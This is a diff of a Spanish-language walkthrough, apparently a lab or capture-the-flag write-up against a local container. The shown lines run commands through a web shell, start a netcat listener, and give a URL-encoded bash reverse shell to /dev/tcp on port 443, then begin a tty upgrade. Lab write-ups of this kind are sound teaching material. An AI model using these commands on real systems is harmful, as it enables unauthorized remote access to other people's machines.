@@ -55,6 +55,7 @@ Probamos a poner "http://172.17.0.2/shell.php?parameter=id" y recibimos la sigui
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 Con esto podemos ver que ya tenemos la ejecucion remota de comandos.
+
 Bien, vamos a intentar hacer una reverse shell, por lo que con NETCAT nos pondremos a la escucha por el puerto 443, por ejemplo:
 ```
 nc -nlvp 443
@@ -67,7 +68,7 @@ Para hacer esto, la propia pagina nos permite pasar dicho comando a formato "URL
 ```
 bash -c "sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261"
 ```
-Con esto hemos obtenido ya la reverse shell y con ello, el acceso a la maquina victima. De todas formas, ahora es momento de hacer un tratamiento de la tty, el cual, se puede hacer de dos maneras, pero en este caso usaremos el modo "clasico"
+Con esto hemos obtenido ya la reverse shell y con ello, el acceso a la maquina victima. De todas formas, ahora es momento de hacer un tratamiento de la tty:
 ```
 1) Escribimos:
 	script /dev/null -c bash
